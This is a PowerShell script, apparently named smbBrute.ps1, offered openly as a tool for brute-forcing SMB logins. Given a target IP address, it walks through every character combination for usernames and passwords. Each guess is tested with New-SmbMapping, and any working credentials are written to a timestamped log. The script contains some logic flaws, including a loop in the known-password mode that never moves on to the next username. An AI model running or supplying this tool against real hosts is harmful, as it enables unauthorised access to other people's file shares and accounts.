<#
.SYNOPSIS
    An SMB Brute Force powershell script

.DESCRIPTION
    Brute Froces SMB to find a valid username and password. Generates an output txt file whose name contains a timestamp.

.PARAMETERS
    
    -IPAddr: [String, Mandatory] , throws Need IP Address Exception
        IP Address of the to be brute forced client

    -lb: [int, DEFAULT = 33]
        Lower bound. The first character to be searched in the Unicode table, as the lower bound. The search does not check character's with lower decimal numbers than lower bound. 
        
    -ub: [int, DEFAULT = 126]
        Upper bound. The last character to be searched in the Unicode table, as the upper bound. The search does not check character's with higher decimal numbers than upper bound.

    -ml: [int, DEFAULT = 1]
        Max Length. The password and username's length is increased level by level in order not to be in infinite loop with 1 char password and infinite char password. This is the first level to be reached.
        Ex: If 2 is selected, first the 1 char usernames and 0,1,2 char passwords will be matched then 2 char usernames and 0,1,2 char passwords. Then the level will be increased.
        Ex: If 100 is selected, first the 1 char usernames and 0,1,2..,100 char passwords will be matched... Then the 100 char usernames and 0,1,2..,100 char passwords will be matched. Then the level will be increased.
                
    -mli: [int, DEFAULT = 1]
        Max Length Increment. When the lengths of the password and username is reached, the maximum length is increased with this value.

    -uc: [int[], DEFAULT = (34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37)]
        Username constraints. List of characters that are forbidden in the username. ( Usernames can not contain   / \ [ ] : ; | = , + * ? < > % )

    -pc: [int[], DEFAULT = 1 .. 31 ]
        Password constraints. List of characters that are forbidden in the password.

    -u: [String, DEFAULT = null]
        Username. If the username is known, only the passwords will be brute forced

    -p: [String, DEFAULT = null]
        Password. If the password is known, only the usernames will be brute forced.

.OUTPUTS
    Generates an output txt file whose name consists of smbBrute and the timestamp.

.EXAMPLES
    .\smbBrute.ps1 127.0.0.1
    .\smbBrute.ps1 127.0.0.1 -lb 10 -ub 200 -ml 5 -mli 2
    .\smbBrute.ps1 127.0.0.1 -uc 1,2,3,6,7,8,9
#>

param (
  [string]$IPAddr = $(throw "Need IP Address"),
  [int] $lb =33, # lower bound
  [int] $ub =126, # upper bound
  [int] $ml =1, # max length
  [int] $mli =1, # max length increment
  # Usernames can not contain   / \ [ ] : ; | = , + * ? < > %
  [int[]] $uc = (34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37), # username constraints , chars that cant be used
  [int[]] $pc = 1 .. 31, #password constraints , chars that cant be used
  [String] $u = $null,
  [String] $p = $null
) # TODO: Try - catch blocks for params

Start-Transcript -path "smbBrute_$(get-date -f dd.MM.yyyy_HH.mm.ss).txt"

Write-Host "**************************************************************************"
Write-Host "SMB BRUTE IS WORKING ON " $IPAddr " SELECTED PARAMS:"
Write-Host "LOWER BOUND FOR PASS: " $lb
Write-Host "UPPER BOUND FOR PASS: " $ub
Write-Host "INITIAL MAX LENGTH: " $ml
Write-Host "MAX LENGTH INCREMENT VALUE: " $mli
Write-Host "USERNAME CAN NOT CONTAIN: " $uc
Write-Host "PASSWORD CAN NOT CONTAIN: " $pc
Write-Host "USERNAME: " $u
Write-Host "PASSWORD: " $p
Write-Host "**************************************************************************"
            
$OldMaxLength = 0

function updateList{
param ([int[]]$list, [bool] $isUsername)

for ($i = $list.Length-1; $i -ge 0 ; $i--){
    $list[$i] ++

    if ( ($isUsername -and $uc -contains $list[$i]) -or (!$isUsername -and $pc -contains $list[$i])){
        $i++ #process again
    }
    elseIf ( $list[$i] -gt $ub ){
        if ($i -ne 0 ){
            $list[$i] = $lb
        }
        else{
            [int[]]$list2 = ,$lb * ($list.Length+1)  # Increase the length and continue
            return $list2
        }
    }
    else {
        break
    }
}
return $list
}
function createString{
param ([int[]]$list)
$out = $null;
   for ($i = 0; $i -lt $list.Length ; $i++){
       $out+=[char]$list[$i] # display as an ASCII character
   }
   return $out
}
function brute {

[int[]]$userPtr =  $lb # username can not be space
[int[]]$passPtr =  0 # password can be null
$user = createString $userPtr #changes to String
$pass = createString $passPtr #changes to String
$Result = $null

#Continue till find a match
:outer while ($true) {

while ($userPtr.Length -le $ml) {

    while ($passPtr.Length -le $ml){ #check pass for this user
        $Result = New-SmbMapping -RemotePath \\$IPAddr -UserName $user -Password $pass -EA SilentlyContinue
        if ( $Result -ne $null ){
            Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
            Write-Host "**************************************************************************"
            Write-Host "BRUTE FORCING SMB CLIENT WORKED ON " $IPAddr "FOUND"
            Write-Host "USERNAME: " $user " PASSWORD:" $pass
            Write-Host "**************************************************************************"
            break outer
        }
        
        Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
        $passPtr = updateList $passPtr $false
        $pass = createString $passPtr
    }
    $userPtr = updateList $userPtr $true
    $user = createString $userPtr 
    if ( $OldMaxLength -eq 0 -or $userPtr.Length -gt $OldMaxLength) {
        $passPtr =  0 # needs to start from the beginning
    }
    else {
        $passPtr =   @($lb) * ($OldMaxLength+1)
    }
    $pass = createString $passPtr
}
$OldMaxLength = $ml
$ml += $mli
$userPtr = $lb
$user = createString $userPtr
$passPtr =  @($lb) * ($OldMaxLength+1) # No need to check previous with the same usernames, no need to check null anymore since there are other characters
$pass = createString $passPtr
}
}
function bruteKnownUser{

[int[]]$passPtr =  0 # password can be null
$pass = createString $passPtr #changes to String
$Result = $null

#Continue till find a match
:outer while ($true) {
     $Result = New-SmbMapping -RemotePath \\$IPAddr -UserName $u -Password $pass -EA SilentlyContinue
     if ( $Result -ne $null ){
        Write-Host "SUCCESS -> User:" $u "PassPtr: " $passPtr "Pass:" $pass
        Write-Host "**************************************************************************"
        Write-Host "BRUTE FORCING SMB CLIENT WORKED ON " $IPAddr "FOUND"
        Write-Host "USERNAME: " $u " PASSWORD:" $pass
        Write-Host "**************************************************************************"
        break outer
      }
        
      Write-Host "FAILED -> User:" $u "PassPtr: " $passPtr "Pass:" $pass
      $passPtr = updateList $passPtr $false
      $pass = createString $passPtr
    }
}
function bruteKnownPass{

[int[]]$userPtr =  $lb
$user = createString $userPtr #changes to String
$Result = $null

#Continue till find a match
:outer while ($true) {
    $Result = New-SmbMapping -RemotePath \\$IPAddr -UserName $user -Password $p -EA SilentlyContinue
    if ( $Result -ne $null ){
        Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "Pass:" $p
        Write-Host "**************************************************************************"
        Write-Host "BRUTE FORCING SMB CLIENT WORKED ON " $IPAddr "FOUND"
        Write-Host "USERNAME: " $user " PASSWORD:" $p
        Write-Host "**************************************************************************"
        break outer
     }
     Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "Pass:" $p
    }
    $userPtr = updateList $userPtr $true
    $user = createString $userPtr 
}

if ($u -ne $null -and $p -ne $null){
    $Result = New-SmbMapping -RemotePath \\$IPAddr -UserName $u -Password $p -EA SilentlyContinue
    if ( $Result -ne $null ){
        Write-Host "SUCCESS -> User:" $u "Pass:" $p
    }
    else{
         Write-Host "FAILED -> User:" $u "Pass:" $p
    }
}
elseif ($u -ne $null) {
    bruteKnownUser
}
elseif ($p -ne $null){
    bruteKnownPass
}
else {
brute
}
Stop-Transcript
